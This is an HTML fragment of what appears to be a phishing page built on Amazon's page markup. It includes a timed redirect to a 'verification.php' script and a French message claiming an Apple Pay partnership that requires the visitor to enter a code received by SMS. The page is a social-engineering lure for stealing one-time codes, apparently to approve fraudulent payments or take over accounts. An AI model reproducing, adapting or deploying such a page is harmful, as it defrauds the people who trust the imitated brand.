...
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-11-05">
   <head>
      ...
      <meta http-equiv="Refresh" content="20; url=./verification.php"/>
                              ...
                              <div class="a-section">
                                 <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                       ...
                                       <center>
                                       <br>
                                       <img src="https://i.stack.imgur.com/kOnzy.gif" width="50">
                                       <br>
                                       <br>
                                       <p>Pour mieux effectuer nos paiement, nous nous sommes affiliés avec Apple Pay, vous avez simplement à entre le code reçu par SMS pour activer Apple Pay</p>
                                       </center>
